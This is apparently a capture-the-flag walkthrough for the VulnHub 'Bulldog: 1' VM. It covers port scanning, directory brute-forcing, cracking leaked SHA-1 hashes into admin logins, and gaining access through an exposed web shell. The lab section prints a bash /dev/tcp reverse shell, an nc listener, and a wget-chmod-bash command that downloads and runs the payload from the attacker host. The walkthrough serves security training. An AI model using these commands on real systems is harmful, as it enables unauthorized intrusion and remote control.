# Bulldog: 1

- **Machine:** Bulldog: 1
- **Download:** https://www.vulnhub.com/entry/bulldog-1,211/

![](images/834-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](images/834-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.166
```

![](images/834-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.166
```

```bash
nmap -sC -sV -A 192.168.2.166
```

---

## HTTP Enumeration

This command performs an aggressive scan and uses the `http-enum` NSE script to discover interesting web directories.

```bash
nmap -v -p 80,8080 -sT -sV -A --script=http-enum.nse 192.168.2.166
```

![](images/834-4.png)

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.166
- http://192.168.2.166:8080
- http://192.168.2.166/robots.txt
- http://192.168.2.166/dev/

---

## Directory Enumeration

Perform directory brute-forcing against the `/dev` directory.

```bash
gobuster dir -u http://192.168.2.166/dev -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak
```

![](images/834-5.png)

---

## Source Code Analysis

Review the page source for sensitive information.

![](images/834-6.png)

### Email Addresses and SHA-1 Hashes

```text
malik@bulldogindustries.com  : c6f7e34d5d08ba4a40dd5627508ccb55b425e279
kevin@bulldogindustries.com  : 0e6ae9fe8af1cd4192865ac97ebf6bda414218a9
ashley@bulldogindustries.com : 553d917a396414ab99785694afd51df3a8a8a3e0
nick@bulldogindustries.com   : ddf45997a7e18a25ad5f5cf222da64814dd060d5
sarah@bulldogindustries.com  : d8b8dd5e7f000b8dea26ef8428caf38c04466b3e
```

---

## Prepare the Hash File

```bash
nano hashes.txt
```

![](images/834-7.png)

---

## Crack the Hashes

Use Hashcat to recover passwords from the discovered SHA-1 hashes.

```bash
hashcat -m 100 hashes.txt /opt/rockyou.txt
```

![](images/834-8.png)

Only two hashes are successfully cracked.

### Cracked Credentials

```text
ddf45997a7e18a25ad5f5cf222da64814dd060d5 : bulldog
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e : bulldoglover
```

### User Mapping

```text
nick  : bulldog
sarah : bulldoglover
```

---

## Directory Enumeration

Continue enumerating the web root.

```bash
gobuster dir -u http://192.168.2.166 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,txt,html
```

![](images/834-9.png)

---

## Admin Login

Visit:

- http://192.168.2.166/admin/

![](images/834-10.png)

### Valid Credentials

```text
Username : nick
Password : bulldog
```

![](images/834-11.png)

Successfully authenticate to the administrative interface.

---

## Web Shell Access

Browse to:

- http://192.168.2.166/dev/shell/

![](images/834-12.png)

Verify command execution.

```bash
pwd
```

```bash
ls -lh
```

![](images/834-13.png)

![](images/834-14.png)

---

## Read the Django Configuration

Display the Django settings file.

```bash
cat bulldog/settings.py
```

### Findings

```text
Django Version      : Django 1.8.7
Secret Key          : Available
Debug Mode          : False
Allowed Hosts       : ['*']
Database            : SQLite3
Static URL          : /static/
Installed Apps      : Default Django applications
```

---

## Enumerate the Application Directory

```bash
ls bulldog
```

![](images/834-15.png)

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

## Verify Required Utilities

Ensure the target system has the required tools and that `/tmp` is writable.

```bash
pwd && which wget && which chmod && which bash && cd /tmp && pwd && ls -la
```

![](images/834-16.png)

This confirms that `wget`, `chmod`, and `bash` are available and that files can be written to `/tmp`.

---

## Create the Reverse Shell Script

```bash
nano reverse_shell.sh
```

Add the following content:

```bash
bash -i >& /dev/tcp/192.168.2.219/443 0>&1
```

![](images/834-17.png)

---

## Host the Payload

Start a Python web server on the attacker machine.

```bash
python -m http.server 8080
```

---

## Start the Listener

```bash
nc -nlvp 443
```

---

## Download and Execute the Payload

Run the following command through the web shell.

```bash
pwd && cd /tmp && wget http://192.168.2.219:8080/reverse_shell.sh && chmod +x reverse_shell.sh && bash reverse_shell.sh
```

![](images/834-18.png)

---

## Reverse Shell Obtained

A reverse shell is successfully established.

![](images/834-19.png)

---

# Impact

- Sensitive information disclosure through exposed source code.
- Password hashes exposed to unauthenticated users.
- Weak passwords allowed administrative access.
- Administrative interface exposed an interactive web shell.
- Remote Code Execution (RCE) achieved.
- Complete compromise of the target system.

---

# Key Learning

- Always inspect HTML source code for hidden information.
- Password hashes should never be exposed to users.
- Weak passwords are easily recoverable using common wordlists.
- Continue enumerating after initial access.
- Configuration files often contain valuable information.
- A web shell can provide a straightforward path to full system compromise.

---

# Summary

The assessment began with web enumeration, revealing source code that exposed multiple email addresses and password hashes. Two hashes were successfully cracked, allowing authentication to the administrative portal. An exposed developer web shell enabled command execution on the server. After confirming the required utilities were available, a reverse shell payload was hosted, downloaded, and executed, resulting in full interactive access to the target machine.